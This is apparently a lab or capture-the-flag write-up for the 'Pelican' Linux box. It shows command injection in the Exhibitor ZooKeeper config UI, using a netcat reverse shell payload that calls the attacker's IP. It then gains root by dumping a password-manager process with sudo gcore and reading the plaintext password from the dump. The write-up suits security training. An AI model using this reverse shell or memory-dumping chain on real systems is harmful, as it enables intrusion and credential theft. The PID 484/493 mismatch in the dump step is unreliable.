#Linux #Exhibitor #ZooKeeper #CommandInjection #gcore #ProcessDump #CredentialRecovery

## Overview

Pelican is a Linux box where the foothold is a command injection vulnerability in Exhibitor for ZooKeeper's web UI, and the privilege escalation involves dumping the memory of a privileged process using `gcore`, a legitimate debugging tool that the current user can run as root via sudo. The password for root surfaces in plaintext inside the memory dump.

## Recon

### Port Scan

```sh
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp  open  netbios-ssn Samba smbd 4.9.5-Debian
631/tcp  open  ipp         CUPS 2.2
2222/tcp open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2
8080/tcp open  http        Jetty 1.0
8081/tcp open  http        nginx 1.14.2
```

Browsing port 8081 triggers a redirect:

```
http://192.168.180.98:8080/exhibitor/v1/ui/index.html
```

> **What Exhibitor is:** Exhibitor is a web-based management UI for Apache ZooKeeper. It provides configuration management including a `java.env script` field that gets evaluated by the ZooKeeper process. Passing shell metacharacters into this field causes command execution.

The vulnerability is documented at:
https://talosintelligence.com/vulnerability_reports/TALOS-2019-0790

## Foothold

### Exhibitor ZooKeeper Command Injection

The exploit requires no credentials. In the Exhibitor web UI:

1. Click the **Config** tab
2. Flip **Editing** to ON
3. In the **java.env script** field, enter a command wrapped in `$()` or backticks

Payload added to the java.env script field:

```sh
$(/bin/nc -e /bin/sh 192.168.45.244 8081 &)
```

Click **Commit > All At Once > OK**. The shell arrives within a minute as user `charles`:

```sh
rlwrap nc -lvnp 8081
connect to [192.168.45.244] from (UNKNOWN) [192.168.180.98] 43810
whoami
charles
```

TTY upgrade:

```sh
script /dev/null -c /bin/bash
```

## Privilege Escalation

### sudo gcore to Dump the password-store Process

Checking sudo permissions:

```sh
sudo -l
User charles may run the following commands on pelican:
    (ALL) NOPASSWD: /usr/bin/gcore
```

`gcore` creates a core dump of any running process. Finding a privileged process worth dumping:

```sh
ps aux | grep root
root   484  0.0  0.0   2276    72 ?   Ss   16:50   0:00 /usr/bin/password-store
```

> **Why dumping `password-store` works:** A password manager process has to hold its secrets in memory to operate. Core dumps capture the full memory image of a process at a point in time, including any strings it was currently working with. The OS permission model normally prevents unprivileged users from dumping privileged processes, but sudo on `gcore` bypasses that entirely.

Dump the process:

```sh
sudo gcore -o output 493
```

Extract readable strings from the dump:

```sh
strings output.484
```

Root credentials surface in plaintext:

```sh
001 Password: root:
ClogKingpinInning731
```

### Switching to Root

```sh
charles@pelican:/opt/zookeeper$ su root
Password: ClogKingpinInning731

root@pelican:/opt/zookeeper# whoami
root
```

## Root

```sh
root@pelican:~# cat proof.txt
‹redacted›
```

## Takeaways

- **Web-facing configuration UIs are often the whole foothold.** Exhibitor's `java.env script` field is essentially a root-level shell through a form input, no CVE number required once you know the functionality exists.
- **`sudo -l` is the first thing to run after foothold.** The privilege of running `gcore` as root looks innocuous until you know what a process dump contains.
- **Process memory holds secrets in plaintext.** Password managers, databases, and authentication daemons all hold credentials in working memory. If you can dump a process, you can read what it was holding.
